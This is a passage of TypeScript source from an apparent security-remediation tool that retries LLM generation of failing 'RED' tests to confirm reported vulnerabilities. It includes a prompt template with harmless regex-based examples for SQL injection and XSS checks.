        // This ensures consistency between the analyze scoring and generate targeting
        let targetPath: string;
        let targetFileContent: string;
        let framework: string;

        if (preSelectedTarget) {
          targetPath = preSelectedTarget.path;
          targetFileContent = preSelectedTarget.content;
          framework = preSelectedTarget.framework;
          logger.info(`Using pre-selected target file: ${targetPath} (framework: ${framework})`);
        } else {
          // Fallback: scan, detect, and analyze from scratch (legacy code path)
          const candidateTestFiles = await this.scanTestFiles();
          if (candidateTestFiles.length === 0) {
            throw new Error('No test files found in repository');
          }

          framework = await this.detectFrameworkWithBackend(issue?.file || '');

          const analysis = await this.testIntegrationClient.analyze({
            vulnerableFile: issue?.file || 'unknown',
            vulnerabilityType: issue?.title || 'unknown',
            candidateTestFiles,
            framework
          });

          if (!analysis.recommendations || analysis.recommendations.length === 0) {
            throw new Error('Backend returned no test file recommendations');
          }

          targetPath = analysis.recommendations[0].path;
          logger.info(`Backend recommended target file: ${targetPath} (score: ${analysis.recommendations[0].score})`);

          const targetFilePath = path.join(this.repoPath, targetPath);
          if (!fs.existsSync(targetFilePath)) {
            throw new Error(`Recommended target file does not exist: ${targetPath}`);
          }
          targetFileContent = fs.readFileSync(targetFilePath, 'utf8');
        }

        // Format test suite for backend API
        const testSuite = this.formatTestSuite(testContent);

        // Detect language from target file
        const language = this.detectLanguage(targetPath);

        // Generate AST-integrated test
        const generated = await this.testIntegrationClient.generate({
          targetFileContent,
          testSuite,
          framework,
          language
        });

        logger.info(`Backend integration succeeded using ${generated.method} method`);
        if (generated.insertionPoint) {
          logger.debug(`Insertion point: line ${generated.insertionPoint.line}, strategy: ${generated.insertionPoint.strategy}`);
        }

        // Return integrated result
        return {
          targetFile: targetPath,
          content: generated.integratedContent
        };

      } catch (error) {
        const isLastAttempt = attempt === maxAttempts;

        if (isLastAttempt) {
          logger.error(`Backend integration failed after ${maxAttempts} attempts`);
          throw error;
        }

        // Check if error is retryable
        const isRetryable = this.isRetryableError(error);
        if (!isRetryable) {
          logger.error(`Non-retryable error: ${error}`);
          throw error;
        }

        // Exponential backoff: 1s, 2s, 4s
        const delay = baseDelay * Math.pow(2, attempt - 1);
        logger.warn(`Attempt ${attempt} failed (${error}), retrying in ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }

    throw new Error('Backend integration failed after all retry attempts');
  }

  /**
   * Determine if error is retryable (transient vs permanent)
   */
  private isRetryableError(error: any): boolean {
    const errorMessage = String(error).toLowerCase();

    // Retryable: Network issues, timeouts, 5xx errors
    const retryablePatterns = [
      'timeout',
      'econnrefused',
      'enotfound',
      'network',
      '503', // Service Unavailable
      '502', // Bad Gateway
      '504', // Gateway Timeout
      '429'  // Too Many Requests (rate limit)
    ];

    // Non-retryable: 4xx client errors (except 429)
    const nonRetryablePatterns = [
      '400', // Bad Request
      '401', // Unauthorized
      '403', // Forbidden
      '404', // Not Found
      '422'  // Unprocessable Entity
    ];

    // Check non-retryable first (more specific)
    if (nonRetryablePatterns.some(pattern => errorMessage.includes(pattern))) {
      return false;
    }

    // Check retryable patterns
    if (retryablePatterns.some(pattern => errorMessage.includes(pattern))) {
      return true;
    }

    // Default: retry on unknown errors (safer)
    return true;
  }


  /**
   * Load false positive cache
   */
  private loadFalsePositiveCache(): void {
    try {
      const cachePath = path.join(this.repoPath, '.rsolv', 'false-positives.json');
      if (fs.existsSync(cachePath)) {
        const data = JSON.parse(fs.readFileSync(cachePath, 'utf8'));
        data.entries?.forEach((entry: any) => {
          // Skip expired entries
          if (entry.expiresAt && new Date(entry.expiresAt) < new Date()) {
            return;
          }
          this.falsePositiveCache.add(entry.pattern);
        });
        logger.info(`Loaded ${this.falsePositiveCache.size} false positive patterns`);
      }
    } catch (error) {
      logger.warn('Could not load false positive cache:', error);
    }
  }
  
  /**
   * Add issue to false positive cache
   */
  private addToFalsePositiveCache(issue: IssueContext): void {
    const cacheKey = this.getCacheKey(issue);
    this.falsePositiveCache.add(cacheKey);
    
    // Persist to disk
    const cachePath = path.join(this.repoPath, '.rsolv', 'false-positives.json');
    const cacheDir = path.dirname(cachePath);
    fs.mkdirSync(cacheDir, { recursive: true });
    
    const entries = Array.from(this.falsePositiveCache).map(pattern => ({
      pattern,
      timestamp: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString() // 30 days
    }));
    
    fs.writeFileSync(cachePath, JSON.stringify({ entries, version: '1.0' }, null, 2));
    logger.info(`Added issue #${issue.number} to false positive cache`);
  }
  
  /**
   * Get cache key for issue
   */
  private getCacheKey(issue: IssueContext): string {
    // Create a unique key based on issue characteristics
    return `${issue.repository}#${issue.number}#${issue.title}`;
  }
  
  /**
   * Ensure git repository is in clean state
   */
  private ensureCleanGitState(): void {
    try {
      const status = execSync('git status --porcelain', { encoding: 'utf8' });
      if (status.trim()) {
        throw new Error('Repository has uncommitted changes');
      }
    } catch (error) {
      logger.warn('Git state check failed:', error);
    }
  }
  

  /**
   * Get current git commit hash
   */
  private getCurrentCommitHash(): string {
    try {
      return execSync('git rev-parse HEAD', { encoding: 'utf8' }).trim();
    } catch {
      return 'unknown';
    }
  }

  /**
   * RFC-060 Phase 2.2: Add GitHub label to issue
   */
  private async addGitHubLabel(issue: IssueContext, label: string): Promise<void> {
    try {
      const githubClient = getGitHubClient(this.config);
      await githubClient.issues.addLabels({
        owner: issue.repository.owner,
        repo: issue.repository.name,
        issue_number: issue.number,
        labels: [label]
      });
      logger.info(`Added label '${label}' to issue #${issue.number}`);
    } catch (error) {
      logger.warn(`Failed to add label '${label}' to issue #${issue.number}:`, error);
    }
  }

  /**
   * RFC-060 Phase 2.2 & 3.1: Store test execution results in PhaseDataClient
   */
  private async storeTestExecutionInPhaseData(
    issue: IssueContext,
    testExecution: TestExecutionResult,
    validated: boolean,
    branchName?: string,
    vulnerabilities?: Array<{ file: string; line: number; type: string; description?: string; confidence?: number | string }>
  ): Promise<void> {
    if (!this.phaseDataClient) {
      logger.debug('PhaseDataClient not available, skipping phase data storage');
      return;
    }

    try {
      await this.phaseDataClient.storePhaseResults(
        'validate',
        {
          validate: {
            [issue.number]: {
              validated,
              branchName,
              testPath: testExecution.testFile,
              testExecutionResult: testExecution,
              vulnerabilities,
              timestamp: new Date().toISOString()
            }
          }
        },
        {
          repo: issue.repository.fullName,
          issueNumber: issue.number,
          commitSha: this.getCurrentCommitHash()
        }
      );
      logger.info(`Stored test execution results in PhaseDataClient for issue #${issue.number}`);
    } catch (error) {
      logger.warn('Failed to store test execution in PhaseDataClient:', error);
    }
  }

  /**
   * RFC-060-AMENDMENT-001: Generate test with retry loop
   * Implements LLM-based test generation with error feedback and retry logic
   */
  async generateTestWithRetry(
    vulnerability: Vulnerability,
    targetTestFile: TestFileContext,
    maxAttempts: number = 3
  ): Promise<TestSuite | null> {
    const previousAttempts: AttemptHistory[] = [];
    const framework = this.frameworkFromName(targetTestFile.framework);

    logger.info(`Starting test generation with retry (max ${maxAttempts} attempts)`);
    logger.info(`Vulnerability: ${vulnerability.type} at ${vulnerability.location}`);
    logger.info(`Target test file: ${targetTestFile.path}`);

    // Ensure runtime and dependencies are available before test execution
    const frameworkNameForSetup = targetTestFile.framework?.toLowerCase() as
      | 'jest' | 'vitest' | 'mocha' | 'rspec' | 'minitest' | 'pytest'
      | 'phpunit' | 'junit' | 'junit5' | 'junit4' | 'testing' | 'exunit';
    if (frameworkNameForSetup) {
      try {
        // Dynamic import to avoid module-level side effects (promisify at load time)
        const { TestRunner: FrameworkTestRunner } = await import('../ai/test-runner.js');
        const testRunnerSetup = new FrameworkTestRunner();
        logger.info(`Ensuring runtime for framework: ${frameworkNameForSetup}`);
        await testRunnerSetup.ensureRuntime(frameworkNameForSetup, this.repoPath);
        logger.info(`Ensuring dependencies for framework: ${frameworkNameForSetup}`);
        await testRunnerSetup.ensureDependencies(frameworkNameForSetup, this.repoPath);
        logger.info('Runtime and dependency setup complete');
        // Defensively ensure mise shims are on PATH — the TestRunner updates
        // process.env.PATH but verify it persisted and add if missing
        const homedir = process.env.HOME || '/root';
        const miseShims = `${homedir}/.local/share/mise/shims`;
        const miseBin = `${homedir}/.local/bin`;
        if (!process.env.PATH?.includes(miseShims)) {
          process.env.PATH = `${miseShims}:${miseBin}:${process.env.PATH || ''}`;
          logger.info(`ValidationMode: Added mise shims to PATH: ${miseShims}`);
        }
        logger.info(`PATH after setup (first 300 chars): ${process.env.PATH?.substring(0, 300)}`);
        // Verify the runtime is actually available after setup
        // Map framework to runtime binary name for verification
        const runtimeBinMap: Record<string, string> = {
          rspec: 'ruby', minitest: 'ruby',
          pytest: 'python',
          phpunit: 'php',
          junit: 'java', junit5: 'java', junit4: 'java',
          exunit: 'elixir',
          testing: 'go',
        };
        const runtimeBin = runtimeBinMap[frameworkNameForSetup] || 'node';
        try {
          const whichResult = execSync(`which ${runtimeBin}`, { encoding: 'utf8', env: process.env }).trim();
          logger.info(`Runtime binary '${runtimeBin}' found at: ${whichResult}`);
        } catch {
          logger.warn(`Runtime binary '${runtimeBin}' not found on PATH after setup`);
          // Last resort: check if the mise shims directory has the binary
          try {
            const shimExists = execSync(`ls -la ${miseShims}/${runtimeBin} 2>/dev/null || echo "NOT_FOUND"`, { encoding: 'utf8' }).trim();
            logger.warn(`Shim check: ${shimExists}`);
          } catch { /* ignore */ }
        }
      } catch (setupError) {
        logger.warn(`Runtime/dependency setup warning: ${setupError instanceof Error ? setupError.message : String(setupError)}`);
        // Continue anyway — test execution may still work (e.g., Node is always available)
      }
    }

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      logger.info(`Attempt ${attempt}/${maxAttempts}: Generating test candidates...`);

      try {
        // 1. Generate test with LLM (pass target file content + previous errors + RFC-101 context)
        // LLM now generates multiple candidate approaches
        const testSuite = await this.generateTestWithLLM(
          vulnerability,
          targetTestFile,
          previousAttempts,
          framework,
          this.projectAiContext || undefined
        );

        const candidates = testSuite.redTests;
        logger.info(`Generated ${candidates.length} test candidate(s)`);

        // 2. Setup for trying candidates
        const targetPath = path.join(this.repoPath, targetTestFile.path);
        fs.mkdirSync(path.dirname(targetPath), { recursive: true });

        // Back up existing file content so we can restore on failure
        const hadExistingFile = fs.existsSync(targetPath);
        const originalContent = hadExistingFile
          ? fs.readFileSync(targetPath, 'utf8')
          : null;

        // Helper to restore original file if this attempt fails
        const restoreOriginal = (): void => {
          try {
            if (originalContent !== null) {
              fs.writeFileSync(targetPath, originalContent, 'utf8');
              logger.debug(`Restored original content of ${targetTestFile.path}`);
            } else if (!hadExistingFile) {
              fs.unlinkSync(targetPath);
              logger.debug(`Removed generated test file: ${targetTestFile.path}`);
            }
          } catch (restoreErr) {
            logger.warn(`Failed to restore original file: ${restoreErr}`);
          }
        };

        // Track candidate-level failures for this attempt
        const candidateFailures: Array<{ candidateIndex: number; error: string; errorMessage: string; generatedCode?: string; testOutput?: string }> = [];
        let successfulCandidate: typeof testSuite | null = null;

        // 3. Try each candidate until one succeeds
        for (let candidateIdx = 0; candidateIdx < candidates.length; candidateIdx++) {
          const candidate = candidates[candidateIdx];
          logger.info(`Trying candidate ${candidateIdx + 1}/${candidates.length}...`);

          // Write this candidate's test code
          fs.writeFileSync(targetPath, candidate.testCode, 'utf8');

          // 3a. Validate syntax and structure
          try {
            await this.validateSyntax(targetPath, framework);
            this.validateTestStructure(targetPath, framework);
            logger.info(`✓ Candidate ${candidateIdx + 1}: Syntax and structure validation passed`);
          } catch (syntaxError) {
            logger.warn(`✗ Candidate ${candidateIdx + 1}: Validation error:`, syntaxError);
            candidateFailures.push({
              candidateIndex: candidateIdx,
              error: 'SyntaxError',
              errorMessage: syntaxError instanceof Error ? syntaxError.message : String(syntaxError),
              generatedCode: candidate.testCode.slice(0, 1500)
            });
            continue; // Try next candidate
          }

          // 3b. Run test (must FAIL on vulnerable code)
          try {
            const testResult = await this.runTest(targetPath, framework, candidate.testName);
            this.lastTestOutput = testResult.output;
            this.lastTestStderr = testResult.stderr;

            if (testResult.passed) {
              // Test passed but should fail — this is actually close! The test runs,
              // it just checks the wrong thing (attack succeeds vs security control exists)
              logger.warn(`✗ Candidate ${candidateIdx + 1}: Test PASSED (should fail on vulnerable code)`);
              const outputSnippet = (testResult.output || '').slice(-500);

              // TWO-PHASE INVERSION: Make a focused LLM call to invert the assertion
              logger.info(`[Two-Phase] Attempting inversion for candidate ${candidateIdx + 1}...`);
              const invertedCode = await this.invertPassingTest(
                candidate.testCode,
                testResult.output || '',
                vulnerability,
                framework
              );

              if (invertedCode) {
                // Log both original and inverted code for debugging
                logger.info(`[Two-Phase] ORIGINAL TEST (first 800 chars):\n${candidate.testCode.slice(0, 800)}`);
                logger.info(`[Two-Phase] INVERTED TEST (first 800 chars):\n${invertedCode.slice(0, 800)}`);

                // Write and test the inverted code
                fs.writeFileSync(targetPath, invertedCode, 'utf8');
                logger.info(`[Two-Phase] Testing inverted code...`);

                // Validate syntax and structure of inverted code
                try {
                  await this.validateSyntax(targetPath, framework);
                  this.validateTestStructure(targetPath, framework);
                } catch (syntaxErr) {
                  logger.warn(`[Two-Phase] Inverted code validation failed: ${syntaxErr}`);
                  // Fall through to record original failure
                  candidateFailures.push({
                    candidateIndex: candidateIdx,
                    error: 'TestPassedUnexpectedly',
                    errorMessage: 'Test passed. Inversion attempt had syntax error.',
                    testOutput: outputSnippet,
                    generatedCode: candidate.testCode.slice(0, 1500)
                  });
                  continue;
                }

                // Run the inverted test
                const invertedResult = await this.runTest(targetPath, framework, candidate.testName);

                if (!invertedResult.passed) {
                  // Inverted test fails — classify to make sure it's a genuine assertion failure
                  const invertedClassification = this.classifyTestResult(
                    invertedResult.exitCode,
                    invertedResult.output,
                    invertedResult.stderr
                  );

                  if (invertedClassification.isValidFailure) {
                    // SUCCESS! The inverted test produces a genuine assertion failure
                    logger.info(`✓ [Two-Phase] SUCCESS! Inverted test produces genuine assertion failure`);
                    successfulCandidate = {
                      ...testSuite,
                      redTests: [{
                        ...candidate,
                        testCode: invertedCode,
                        testName: `${candidate.testName}_inverted`
                      }]
                    };
                    break; // Exit candidate loop — we found a working test!
                  } else {
                    logger.warn(`[Two-Phase] Inverted test failed but not a valid assertion: ${invertedClassification.type}`);
                  }
                } else {
                  logger.warn(`[Two-Phase] Inverted test still passes — inversion didn't work`);
                  logger.info(`[Two-Phase] Inverted test output (last 500 chars): ${(invertedResult.output || '').slice(-500)}`);
                }
              } else {
                logger.warn(`[Two-Phase] Inversion call returned no code`);
              }

              // Inversion didn't work — record the original failure
              candidateFailures.push({
                candidateIndex: candidateIdx,
                error: 'TestPassedUnexpectedly',
                errorMessage: 'Test passed — you checked if the attack succeeds (it does). Inversion attempted but failed.',
                testOutput: outputSnippet,
                generatedCode: candidate.testCode.slice(0, 1500)
              });
              continue; // Try next candidate
            }

            // 3c. Classify test failure — is it a genuine assertion failure or an infrastructure crash?
            const classification = this.classifyTestResult(
              testResult.exitCode,
              testResult.output,
              testResult.stderr
            );

            if (!classification.isValidFailure) {
              logger.warn(`✗ Candidate ${candidateIdx + 1}: ${classification.type} — ${classification.reason}`);
              const errorDetails = (testResult.stderr || testResult.output || '')
                .split('\n')
                .filter(line => /error|cannot|not found|load|missing|undefined/i.test(line))
                .slice(0, 5)
                .join('\n');
              candidateFailures.push({
                candidateIndex: candidateIdx,
                error: classification.type,
                errorMessage: `${classification.reason}${errorDetails ? ': ' + errorDetails : ''}`,
                generatedCode: candidate.testCode.slice(0, 1500)
              });
              continue; // Try next candidate
            }

            logger.info(`✓ Candidate ${candidateIdx + 1}: Genuine assertion failure: ${classification.reason}`);

            // 3d. Check for regressions (existing tests should still pass)
            if (testResult.existingTestsFailed) {
              logger.warn(`✗ Candidate ${candidateIdx + 1}: Existing tests failed (regression)`);
              candidateFailures.push({
                candidateIndex: candidateIdx,
                error: 'ExistingTestsRegression',
                errorMessage: `Existing tests failed: ${testResult.failedTests?.join(', ')}`,
                generatedCode: candidate.testCode.slice(0, 1500)
              });
              continue; // Try next candidate
            }

            // Success! This candidate is valid
            logger.info(`✓ Candidate ${candidateIdx + 1}: SUCCESS — genuine assertion failure on vulnerable code`);
            successfulCandidate = {
              ...testSuite,
              redTests: [candidate] // Return only the successful candidate
            };
            break; // Exit candidate loop

          } catch (testError) {
            logger.error(`✗ Candidate ${candidateIdx + 1}: Execution error:`, testError);
            candidateFailures.push({
              candidateIndex: candidateIdx,
              error: 'TestExecutionError',
              errorMessage: testError instanceof Error ? testError.message : String(testError),
              generatedCode: candidate.testCode.slice(0, 1500)
            });
            continue; // Try next candidate
          }
        }

        // Restore original file after trying all candidates
        restoreOriginal();

        // If we found a successful candidate, return it
        if (successfulCandidate) {
          logger.info(`✓ Test generation successful on attempt ${attempt}`);
          return successfulCandidate;
        }

        // All candidates failed — record best failure for retry feedback
        // Prioritize TestPassedUnexpectedly (closest to success) over other errors
        const passedButWrong = candidateFailures.find(f => f.error === 'TestPassedUnexpectedly');
        const bestFailure = passedButWrong || candidateFailures[candidateFailures.length - 1];

        if (bestFailure) {
          logger.warn(`All ${candidates.length} candidates failed. Best attempt: ${bestFailure.error}`);
          previousAttempts.push({
            attempt,
            error: bestFailure.error,
            errorMessage: bestFailure.errorMessage,
            generatedCode: bestFailure.generatedCode,
            testOutput: bestFailure.testOutput,
            timestamp: new Date().toISOString()
          });
        }

      } catch (error) {
        logger.error(`Error during test generation attempt ${attempt}:`, error);
        previousAttempts.push({
          attempt,
          error: 'GenerationError',
          errorMessage: error instanceof Error ? error.message : String(error),
          timestamp: new Date().toISOString()
        });
      }
    }

    // All retries exhausted - tag issue and return null
    logger.warn(`Failed to generate valid test after ${maxAttempts} attempts`);
    await this.tagIssueNotValidated(vulnerability, previousAttempts);
    return null;
  }

  /**
   * Generate test using LLM with vulnerability context and retry feedback.
   * Calls the AI client directly — no indirection through TestGeneratingSecurityAnalyzer.
   */
  private async generateTestWithLLM(
    vulnerability: Vulnerability,
    targetTestFile: TestFileContext,
    previousAttempts: AttemptHistory[],
    framework: TestFramework,
    aiContext?: string
  ): Promise<TestSuite> {
    const prompt = this.buildLLMPrompt(vulnerability, targetTestFile, previousAttempts, framework, aiContext);

    const aiClient = await getAiClient(this.config.aiProvider);
    const response = await aiClient.complete(prompt, {
      temperature: 0.2,
      maxTokens: this.config.aiProvider.maxTokens,
      model: this.config.aiProvider.model,
      // Extended thinking for better reasoning about RED tests
      thinking: {
        type: 'enabled',
        budget_tokens: 10000
      }
    });

    const redTests = this.parseTestResponse(response, vulnerability, framework);

    if (redTests.length === 0) {
      throw new Error('LLM failed to generate test suite');
    }

    return {
      framework: framework.name,
      testFile: targetTestFile.path,
      redTests
    };
  }

  /**
   * Get the language identifier for a test framework (used in code block fences).
   */
  private getLanguageForFramework(framework: TestFramework): string {
    const languageMap: Record<string, string> = {
      jest: 'javascript',
      vitest: 'javascript',
      mocha: 'javascript',
      rspec: 'ruby',
      minitest: 'ruby',
      pytest: 'python',
      phpunit: 'php',
      junit: 'java',
      junit5: 'java',
      junit4: 'java',
      exunit: 'elixir',
      testing: 'go'
    };
    return languageMap[framework.name] || framework.name;
  }

  /**
   * Clean markdown artifacts from extracted code.
   * AI sometimes includes formatting like **Approach 3:** or ### Headers in code blocks.
   */
  private cleanExtractedCode(code: string): string {
    let cleaned = code;

    // Remove markdown bold/italic: **text**, *text*, __text__, _text_
    // But be careful not to break Python **kwargs or pointer dereference
    // Only remove if it looks like a heading/label (followed by colon or end of line)
    cleaned = cleaned.replace(/^\s*\*\*[^*]+\*\*:?\s*$/gm, ''); // Lines that are just **Label:**
    cleaned = cleaned.replace(/^\s*\*[^*]+\*:?\s*$/gm, '');     // Lines that are just *Label:*

    // Remove markdown headers at start of lines: ## Header, ### Header
    cleaned = cleaned.replace(/^#{1,6}\s+.*$/gm, '');

    // Remove markdown bullet points at start of lines (but keep if it's valid code indent)
    // Only remove if line starts with `- ` followed by text (not code)
    cleaned = cleaned.replace(/^-\s+(?=[A-Z])/gm, ''); // Bullet followed by capital letter (likely prose)

    // Remove stray triple backticks that might have leaked through
    cleaned = cleaned.replace(/^```\w*\s*$/gm, '');
    cleaned = cleaned.replace(/^```\s*$/gm, '');

    // Remove lines that are purely markdown labels like "Approach 1:", "Method:", etc.
    cleaned = cleaned.replace(/^\s*(?:Approach|Method|Option|Solution|Step)\s*\d*:?\s*$/gim, '');

    // Remove empty lines that resulted from the above removals (collapse multiple blank lines)
    cleaned = cleaned.replace(/\n{3,}/g, '\n\n');

    return cleaned.trim();
  }

  /**
   * Parse LLM response into structured red test entries.
   * Extracts ALL code blocks (for multi-candidate) and wraps as TestSuite redTests.
   */
  private parseTestResponse(
    response: string,
    vulnerability: Vulnerability,
    framework: TestFramework
  ): TestSuite['redTests'] {
    // Extract ALL code blocks from response (multi-candidate support)
    const codeBlockRegex = /```(?:javascript|typescript|ruby|python|php|elixir|java|js|ts|rb|py|ex|exs)?\s*\n([\s\S]*?)```/g;
    const allCodeBlocks: string[] = [];
    let match;
    while ((match = codeBlockRegex.exec(response)) !== null) {
      const rawCode = match[1]?.trim();
      if (rawCode && rawCode.length > 0) {
        // Clean markdown artifacts that may have leaked into code blocks
        const cleanedCode = this.cleanExtractedCode(rawCode);
        if (cleanedCode.length > 0) {
          allCodeBlocks.push(cleanedCode);
        }
      }
    }

    // If we found multiple code blocks, treat each as a separate candidate
    if (allCodeBlocks.length > 1) {
      return allCodeBlocks.map((code, i) => ({
        testName: `security_${vulnerability.type}_approach_${i + 1}`,
        testCode: code,
        attackVector: vulnerability.attackVector,
        expectedBehavior: 'should_fail_on_vulnerable_code' as const
      }));
    }

    // Single code block or no code blocks — use original parsing logic
    const testCode = allCodeBlocks[0] || response.trim();
    if (!testCode) return [];

    // Try structured JSON response first
    try {
      const parsed = JSON.parse(testCode);
      if (Array.isArray(parsed.redTests)) return parsed.redTests;
      if (Array.isArray(parsed.red)) return parsed.red;
      if (parsed.testCode) return [parsed];
    } catch {
      // Not JSON — treat as raw test code
    }

    // Split on describe/it/test blocks if multiple tests in single block
    const testBlocks = testCode.split(/\n(?=(?:describe|it|test)\s*\()/);
    if (testBlocks.length > 1) {
      // Check if first block is only imports/requires (no test structure)
      const firstBlock = testBlocks[0].trim();
      const isImportOnly = firstBlock.length > 0 &&
        !(/\b(?:describe|it|test)\s*\(/.test(firstBlock));

      if (isImportOnly) {
        const preamble = testBlocks[0];
        const testOnlyBlocks = testBlocks.slice(1).filter(b => b.trim().length > 0);

        return testOnlyBlocks.map((block, i) => ({
          testName: testOnlyBlocks.length === 1
            ? `security_${vulnerability.type}_test`
            : `security_${vulnerability.type}_test_${i + 1}`,
          testCode: (preamble + '\n' + block).trim(),
          attackVector: vulnerability.attackVector,
          expectedBehavior: 'should_fail_on_vulnerable_code' as const
        }));
      }

      // All blocks self-contained — original behavior
      return testBlocks
        .filter(block => block.trim().length > 0)
        .map((block, i) => ({
          testName: `security_${vulnerability.type}_test_${i + 1}`,
          testCode: block.trim(),
          attackVector: vulnerability.attackVector,
          expectedBehavior: 'should_fail_on_vulnerable_code'
        }));
    }

    // Single test — wrap as-is
    return [{
      testName: `security_${vulnerability.type}_test`,
      testCode,
      attackVector: vulnerability.attackVector,
      expectedBehavior: 'should_fail_on_vulnerable_code'
    }];
  }

  /**
   * Build LLM prompt with vulnerability context and retry feedback
   */
  private buildLLMPrompt(
    vulnerability: Vulnerability,
    targetTestFile: TestFileContext,
    previousAttempts: AttemptHistory[],
    framework: TestFramework,
    aiContext?: string
  ): string {
    const realisticExamples = this.getRealisticVulnerabilityExample(vulnerability.type);

    let prompt = `Generate a RED test for a security vulnerability.

VULNERABILITY: ${vulnerability.description}
TYPE: ${vulnerability.type}
LOCATION: ${vulnerability.location}
ATTACK VECTOR: ${vulnerability.attackVector}
${vulnerability.vulnerablePattern ? `VULNERABLE PATTERN: ${vulnerability.vulnerablePattern}` : ''}
${vulnerability.source ? `SOURCE: ${vulnerability.source}\nVULNERABLE SOURCE FILE: ${vulnerability.source}` : ''}
${aiContext ? `\nENVIRONMENT CONTEXT:\n${aiContext}\n` : ''}
${realisticExamples}
${this.getAssertionTemplateSection(vulnerability, framework)}
TARGET TEST FILE: ${targetTestFile.path}
FRAMEWORK: ${framework.name}
${this.availableTestLibraries.length > 0 ? `
AVAILABLE TEST LIBRARIES: ${this.availableTestLibraries.join(', ')}
IMPORTANT: Only use assertion libraries from the list above. DO NOT use libraries like 'chai' or 'expect' if they are not listed.
If no assertion library is available, use Node's built-in 'assert' module (const assert = require('assert');).
` : ''}
${this.getAssertionStyleSection(framework)}
TARGET FILE CONTENT (for context):
\`\`\`
${targetTestFile.content}
\`\`\`

UNDERSTANDING RED TESTS:
A "RED" test is a test that FAILS on the current vulnerable code. The failure proves the vulnerability exists.
The key insight: assert what SECURE code would do, so the assertion FAILS when run against INSECURE code.

Example RED test for SQL injection (Mocha/JavaScript using Node's built-in assert):
\`\`\`javascript
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const source = fs.readFileSync(path.join(process.cwd(), 'routes/users.js'), 'utf8');
describe('SQL Injection Prevention', function() {
  it('should use parameterized queries to prevent SQL injection', function() {
    // This assertion FAILS because the code uses string interpolation, not parameterized queries
    assert.match(source, /\\$[0-9]|\\?\\s*,|:param/);  // parameterized placeholder pattern
  });
});
\`\`\`
This test FAILS because the vulnerable code uses string interpolation, not parameterized queries.

Example RED test for XSS (Mocha/JavaScript using Node's built-in assert):
\`\`\`javascript
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const source = fs.readFileSync(path.join(process.cwd(), 'views/profile.js'), 'utf8');
describe('XSS Prevention', function() {
  it('should escape HTML in user output', function() {
    // This assertion FAILS because the code outputs user input without escaping
    assert.doesNotMatch(source, /res\\.send\\([^)]*\\$\\{.*user/);  // unescaped template literal
    assert.match(source, /escapeHtml|sanitize|textContent/);     // sanitization function
  });
});
\`\`\`
This test FAILS because the vulnerable code does NOT use escapeHtml/sanitize.

NOTE: The examples above use Node's built-in assert. If other assertion libraries are listed in AVAILABLE TEST LIBRARIES, you may use them instead.

YOUR TASK:
Generate 3 DIFFERENT test approaches. Each approach MUST be in its own separate code block.

OUTPUT FORMAT (IMPORTANT):
Return ONLY valid ${this.getLanguageForFramework(framework)} code inside each code block.
DO NOT include markdown formatting, headers, labels, or prose INSIDE the code blocks.
Code blocks must contain ONLY executable code — no "Approach 1:" labels, no bullet points, no explanations.

Place any explanations OUTSIDE and BEFORE the code blocks, like this:

First approach uses pattern matching:
\`\`\`${this.getLanguageForFramework(framework)}
// Actual test code here — no markdown, no labels
\`\`\`

Second approach uses static analysis:
\`\`\`${this.getLanguageForFramework(framework)}
// Actual test code here — no markdown, no labels
\`\`\`

Third approach uses behavioral assertions:
\`\`\`${this.getLanguageForFramework(framework)}
// Actual test code here — no markdown, no labels
\`\`\`

CRITICAL: Each code block must be a COMPLETE, STANDALONE test file with valid syntax.
DO NOT include text like "**Approach 1:**" or "### Pattern Matching" inside the code blocks — that causes syntax errors.

Each test should:
1. Use the attack vector: ${vulnerability.attackVector}
2. FAIL on vulnerable code (assert what secure code would do — since the code is insecure, the assertion fails)
3. PASS after fix is applied (once the code is fixed, the assertion passes)
4. Be completely standalone (no require of rails_helper, spec_helper, or app-specific helpers)
5. Follow ${framework.name} conventions

APPROACH STRATEGIES:
- Approach 1: Pattern matching — read source file, check for ABSENCE of security patterns (parameterized queries, escaping, etc.)
- Approach 2: Static analysis — read source file, check for PRESENCE of dangerous patterns (string interpolation in queries, raw output, etc.)
- Approach 3: Different assertion style — try a fundamentally different way to prove the same vulnerability
${vulnerability.source ? `6. IMPORT the actual source file — do NOT inline/copy vulnerable code into the test.
   The test runs with process.cwd() set to the repository root.
   Use one of these strategies to reference the vulnerable source file:

   Strategy A — require() (for modules that export values without side effects):
   const target = require(path.join(process.cwd(), '${vulnerability.source}'));

   Strategy B — fs.readFileSync() (for files with side effects like DB connections, HTTP servers):
   const sourceCode = fs.readFileSync(path.join(process.cwd(), '${vulnerability.source}'), 'utf8');
   Then use pattern matching, regex, or parsing to test the source content.

   Choose Strategy A when the file exports testable values (configs, utilities, pure functions).
   Choose Strategy B when requiring the file would trigger side effects (route handlers, middleware, DB models).
${(() => {
  const src = vulnerability.source || '';
  const isLikelyConfig = /config|settings|env|\.config\./i.test(src);
  const isLikelyRouteHandler = /routes?|controllers?|middleware|handlers?/i.test(src);
  const isLikelyModel = /models?|dao|data|schema/i.test(src);
  if (isLikelyConfig) {
    return `\n   HINT: '${src}' appears to be a CONFIG file — prefer Strategy A (require()).`;
  } else if (isLikelyRouteHandler || isLikelyModel) {
    return `\n   HINT: '${src}' appears to be a route/model file — prefer Strategy B (readFileSync()).`;
  }
  return '';
})()}
   IMPORTANT: Always use path.join(process.cwd(), '<relative-path>') — never use relative require paths like '../'.` : `6. Is SELF-CONTAINED — inline the vulnerable pattern directly in the test.`}`;

    if (previousAttempts.length > 0) {
      prompt += '\n\nPREVIOUS ATTEMPTS (learn from these errors):';
      for (const attempt of previousAttempts) {
        prompt += `\n- Attempt ${attempt.attempt}: ${attempt.error} - ${attempt.errorMessage}`;
      }

      // Include the last attempt's generated code and test output so the AI can see what went wrong
      const lastAttempt = previousAttempts[previousAttempts.length - 1];
      if (lastAttempt.generatedCode) {
        prompt += `\n\nYOUR PREVIOUS TEST CODE (attempt ${lastAttempt.attempt}):\n\`\`\`\n${lastAttempt.generatedCode}\n\`\`\``;
      }
      if (lastAttempt.testOutput) {
        prompt += `\n\nTEST OUTPUT FROM PREVIOUS ATTEMPT:\n\`\`\`\n${lastAttempt.testOutput}\n\`\`\``;
      }

      // RFC-103: Add specific guidance based on error types using enhanced feedback
      const lastError = lastAttempt.error;
      if (lastError === 'SyntaxError') {
        // Use enhanced feedback for syntax errors
